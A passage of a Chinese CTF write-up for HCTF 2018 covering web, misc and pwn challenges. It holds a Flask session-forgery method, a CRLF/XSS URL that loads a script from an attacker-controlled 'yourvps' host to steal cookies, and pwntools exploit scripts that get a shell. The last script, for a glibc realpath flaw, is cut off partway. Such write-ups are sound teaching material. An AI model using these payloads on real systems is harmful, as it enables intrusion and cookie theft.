class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">'1'</span>):</span><br><span class="line">        session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    username=request.form[<span class="string">'username'</span>]</span><br><span class="line">    password=request.form[<span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">'username'</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    file = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'This file already exists'</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">'_'</span></span><br><span class="line">        os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">'rm -rf '</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="keyword">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, debug=<span class="keyword">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure></p><p>因为有这段 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br></pre></td></tr></table></figure></p><p>如果文件里有hctf就返回主页 所以不能直接读flag.py，也没有flag.pyc 后面读index.html发现admin用户登录就能看到flag <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  &#123;% <span class="keyword">if</span> user == <span class="string">'admin'</span> %&#125;</span><br><span class="line">        Your flag: &lt;br&gt;</span><br><span class="line">        &#123;&#123; flag  &#125;&#125;</span><br></pre></td></tr></table></figure></p><p>想到要读secret，伪造admin的session，发现代码里的secret是伪随机的 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br></pre></td></tr></table></figure></p><p>随机数种子固定为mac地址，读取 /sys/class/net/eth0/address 可以得到 然后带入seed，本地跑一下，登陆admin拿到cookie，再放到网站上就能看到flag了 <img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/hide_and_seek_00.png"></p><h2><span id="game">Game</span></h2><p>赛后解出： http://game.2018.hctf.io/web2/user.php?order=password 这样可以按照密码进行排序 不断注册新用户，密码逐位逐位与admin的密码比较，最后得到admin的密码，比如注册个密码为d的用户</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/Game_00.png"></p><p>然后按密码排序，发现它在admin下面</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/Game_01.png"></p><p>然后注册一个密码为e的用户，发现他在admin上面</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/Game_02.png"></p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/Game_03.png"></p><p>由此可以推算出admin密码第一位是d，按照此原理，逐位得到完整的admin密码为<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/Game_04.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## bottle</span><br><span class="line">直接参考p总链接即可:</span><br><span class="line">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</span><br><span class="line"></span><br><span class="line">首先发现CLRF</span><br><span class="line"></span><br><span class="line">![](https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/bottle_00.png)</span><br><span class="line"></span><br><span class="line">刚开始的时候，CSP是在响应包的上面的，需要想办法绕过CSP。</span><br><span class="line">第二天CSP被设置到响应包下面了。</span><br><span class="line">接下来就简单了，只需要绕过302跳转就可以打到cookie。因为302的时候不会xss。利用`&lt;80`端口可以绕过302跳转。可以在浏览器手动试一下。</span><br><span class="line"></span><br><span class="line">80端口的时候可以发现跳转到了题目的首页</span><br><span class="line"></span><br><span class="line">小于80端口的时候可以发现返回了我们构造的响应包下面的内容，这个时候手动访问可以看到打到了cookie。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">所以拿着下面这个payload就可以打到cookie了。</span><br><span class="line">http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/%0d%0aContent-Length:%2065%0d%0a%0d%0a%3Cscript%20src=http://yourvps/cookie.js%3E%3C/script%3E</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">改cookie登陆</span><br><span class="line"></span><br><span class="line">![](https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/bottle_01.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Misc</span><br><span class="line">## easy dump</span><br><span class="line">用volatility看了一下，发现有mspaint进程，把内存dump下来</span><br><span class="line">把mspaint.exe dump下来的内存改名为.data后缀，用gimp打开，调整位移 宽度 高度</span><br><span class="line"></span><br><span class="line">![](https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Misc/easy_dump_00.png)</span><br><span class="line"></span><br><span class="line">&gt; `flag:hctf&#123;big_brother_is_watching_you&#125;`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## freq game</span><br></pre></td></tr></table></figure></p><p>FFT different frequency sin MATLAB: y = importdata(""); 加载样本点 Y = fft(y); plot(abs(Y)); <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">![](https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Misc/freq_game_00.png)</span><br><span class="line"></span><br><span class="line">根据图片查看频率值，对称的四个正弦函数的频率，最高点对应的横坐标减1就是频率</span><br><span class="line">交互8次，即可得到flag</span><br><span class="line"></span><br><span class="line">## difficult programming language</span><br><span class="line">解压后发现一个pcap包，Wireshark打开发现是USB流量包，简单浏览后发现每帧都有8字节，且仅第一字节和第三字节有数据，猜测是键盘的流量，于是本地自己抓键盘的包试了下：</span><br><span class="line">第一个字节</span><br><span class="line">0x01 ctrl</span><br><span class="line">0x02 shift</span><br><span class="line">第三个字节是按键的键值就不列出了，后面找了下相关资料验证了这个猜想，于是tshark先把每帧的Leftover Capture Data提取出来，然后写个脚本把键值转成字符串，得到一个混杂字母和符号的字符串，根据题目所给“difficult programming language”猜测可能是malbolge语言，找个解释器把解出的字符串丢进去跑一下就得到flag。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">代码：</span><br><span class="line"></span><br><span class="line">``` python</span><br><span class="line">usb_data = open(&apos;usbdata.txt&apos;)</span><br><span class="line"></span><br><span class="line">str_decode = &apos;&apos;</span><br><span class="line"></span><br><span class="line">for i in range(422):</span><br><span class="line">    buffer = usb_data.readline()</span><br><span class="line">    cmd = int(buffer[6] + buffer[7], 16)</span><br><span class="line">    if cmd != 0:</span><br><span class="line">        if buffer[1] == &apos;0&apos;:</span><br><span class="line">            if 4 &lt;= cmd &lt;= 29:</span><br><span class="line">                str_decode += chr(ord(&apos;a&apos;) + cmd - 4)</span><br><span class="line">            elif 30 &lt;= cmd &lt;= 38:</span><br><span class="line">                str_decode += chr(ord(&apos;1&apos;) + cmd - 30)</span><br><span class="line">            elif cmd == 39:</span><br><span class="line">                str_decode += &apos;0&apos;</span><br><span class="line"></span><br><span class="line">            elif cmd == 45:</span><br><span class="line">                str_decode += &apos;-&apos;</span><br><span class="line">            elif cmd == 46:</span><br><span class="line">                str_decode += &apos;=&apos;</span><br><span class="line">            elif cmd == 47:</span><br><span class="line">                str_decode += &apos;[&apos;</span><br><span class="line">            elif cmd == 48:</span><br><span class="line">                str_decode += &apos;]&apos;</span><br><span class="line">            elif cmd == 49:</span><br><span class="line">                str_decode += &apos;\\&apos;</span><br><span class="line">            elif cmd == 51:</span><br><span class="line">                str_decode += &apos;;&apos;</span><br><span class="line">            elif cmd == 52:</span><br><span class="line">                str_decode += &quot;&apos;&quot;</span><br><span class="line">            elif cmd == 53:</span><br><span class="line">                str_decode += &apos;`&apos;</span><br><span class="line">            elif cmd == 54:</span><br><span class="line">                str_decode += &apos;,&apos;</span><br><span class="line">            elif cmd == 55:</span><br><span class="line">                str_decode += &apos;.&apos;</span><br><span class="line">            elif cmd == 56:</span><br><span class="line">                str_decode += &apos;/&apos;</span><br><span class="line"></span><br><span class="line">            else:</span><br><span class="line">                print(&apos;!!!&apos;)</span><br><span class="line">        elif buffer[1] == &apos;2&apos;:</span><br><span class="line">            if 4 &lt;= cmd &lt;= 29:</span><br><span class="line">                str_decode += chr(ord(&apos;A&apos;) + cmd - 4)</span><br><span class="line">            # elif 30 &lt;= cmd &lt;= 38:</span><br><span class="line">            #     str_decode += &apos;!!!&apos;</span><br><span class="line"></span><br><span class="line">            elif cmd == 30:</span><br><span class="line">                str_decode += &apos;!&apos;</span><br><span class="line">            elif cmd == 31:</span><br><span class="line">                str_decode += &apos;@&apos;</span><br><span class="line">            elif cmd == 32:</span><br><span class="line">                str_decode += &apos;#&apos;</span><br><span class="line">            elif cmd == 33:</span><br><span class="line">                str_decode += &apos;$&apos;</span><br><span class="line">            elif cmd == 34:</span><br><span class="line">                str_decode += &apos;%&apos;</span><br><span class="line">            elif cmd == 35:</span><br><span class="line">                str_decode += &apos;^&apos;</span><br><span class="line">            elif cmd == 36:</span><br><span class="line">                str_decode += &apos;&amp;&apos;</span><br><span class="line">            elif cmd == 37:</span><br><span class="line">                str_decode += &apos;*&apos;</span><br><span class="line">            elif cmd == 38:</span><br><span class="line">                str_decode += &apos;(&apos;</span><br><span class="line">            elif cmd == 39:</span><br><span class="line">                str_decode += &apos;)&apos;</span><br><span class="line">            elif cmd == 45:</span><br><span class="line">                str_decode += &apos;_&apos;</span><br><span class="line">            elif cmd == 46:</span><br><span class="line">                str_decode += &apos;+&apos;</span><br><span class="line">            elif cmd == 47:</span><br><span class="line">                str_decode += &apos;&#123;&apos;</span><br><span class="line">            elif cmd == 48:</span><br><span class="line">                str_decode += &apos;&#125;&apos;</span><br><span class="line">            elif cmd == 49:</span><br><span class="line">                str_decode += &apos;|&apos;</span><br><span class="line">            elif cmd == 51:</span><br><span class="line">                str_decode += &apos;:&apos;</span><br><span class="line">            elif cmd == 52:</span><br><span class="line">                str_decode += &apos;&quot;&apos;</span><br><span class="line">            elif cmd == 53:</span><br><span class="line">                str_decode += &apos;~&apos;</span><br><span class="line">            elif cmd == 54:</span><br><span class="line">                str_decode += &apos;&lt;&apos;</span><br><span class="line">            elif cmd == 55:</span><br><span class="line">                str_decode += &apos;&gt;&apos;</span><br><span class="line">            elif cmd == 56:</span><br><span class="line">                str_decode += &apos;?&apos;</span><br><span class="line"></span><br><span class="line">            else:</span><br><span class="line">                print(&apos;!!!&apos;)</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;!!!&apos;)</span><br><span class="line">            print(buffer)</span><br><span class="line">print(str_decode)</span><br></pre></td></tr></table></figure></p><blockquote><p><code>flag:hctf{m4lb0lGe}</code></p></blockquote><h1><span id="pwn">Pwn</span></h1><h2><span id="the_end">the_end</span></h2><p>有点像0ctf2017-left:</p><p>exit会调用dl_fini，里面有一个call，可以去修改ld.so 附近的一个地方，直接填one_gadget get shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">e=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./the_end'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'150.109.44.250'</span>, <span class="number">20002</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> debug:</span><br><span class="line">    ru(<span class="string">'Input your token:'</span>)</span><br><span class="line">    se(<span class="string">'uvm73jg2AFMECo71DIZRZh39MRqFOI2w\n'</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'here is a gift '</span>)</span><br><span class="line">base=int(ru(<span class="string">','</span>)[:<span class="number">-1</span>],<span class="number">16</span>)-e.symbols[<span class="string">'sleep'</span>]</span><br><span class="line">call=base+<span class="number">0x5F0F48</span></span><br><span class="line">one_gadget=p64(base+<span class="number">0xf02a4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    se(p64(call+i))</span><br><span class="line">    se(one_gadget[i])</span><br><span class="line"></span><br><span class="line">print(hex(base))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'cat flag&gt;&amp;0'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p><code>flag:hctf{706a09271a59b9e2db1a2d0cf1e40e2073c0a886197f6f3cf3b5d2114fc600d7}</code></p></blockquote><h2><span id="easyexp">easyexp</span></h2><p>clone 了一个子线程，mount 了tmpfs到/tmp那里，再chdir到mount的这个tmp那里，然后sleep 1000000秒之后 结束 设子线程pid=cpid 主线程chdir到 /proc/cpid/cwd/ ，然后在里面创建文件夹和假flag ls没有限制 / 和 .. 所以可以看所有目录的情况</p><p>根据hint提示，要用libc-2.23_9 ，我虚拟机的是libc-2.23_10，然后去找了下change log <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+  * SECURITY UPDATE: Buffer underflow in realpath()</span><br><span class="line">+    - debian/patches/any/cvs-make-getcwd-fail-if-path-is-no-absolute.diff:</span><br><span class="line">+      Make getcwd(3) fail if it cannot obtain an absolute path</span><br><span class="line">+    - CVE-2018-1000001</span><br></pre></td></tr></table></figure></p><p>发现realpath有一个overflow</p><p>所以大概关键就在canonicalize_file_name这个函数这里</p><p>https://paper.seebug.org/528/</p><p>就是CVE–2018-1000001</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Pwn/easyexp_00.png"></p><p>（之前就想拿这个CVE来出题........可惜怕被当成kernel题就没敢出 （没复现CVE，现在要去看一遍源码.......</p><p>一开始输入名字的时候输入(unreachable)，然后在里面创建一个tmp文件，这样就可以绕过realpath 里面的一个检查</p><p>利用的话是改chunk size，unsafe unlink，再拿到任意读写，get shell（话说好久没碰到要用unsafe unlink的题，都生疏了..........</p><p>payload 如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">e=ELF(<span class="string">'./libc-2.23_9.so'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    <span class="comment">#p=process('./easyexp')</span></span><br><span class="line">    p=process(<span class="string">'./easyexp'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc-2.23_9.so'</span>&#125;)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'150.109.46.159'</span>, <span class="number">20004</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkfile</span><span class="params">(name,content)</span>:</span></span><br><span class="line">    sl(<span class="string">'mkfile '</span>+name)</span><br><span class="line">    ru(<span class="string">'write something:'</span>)</span><br><span class="line">    sl(content)</span><br><span class="line">    ru(<span class="string">'$'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cat</span><span class="params">(name)</span>:</span></span><br><span class="line">    sl(<span class="string">'cat '</span>+name)</span><br><span class="line">    <span class="keyword">return</span> ru(<span class="string">'$'</span>)</span><br><span class="line"></span><br><span 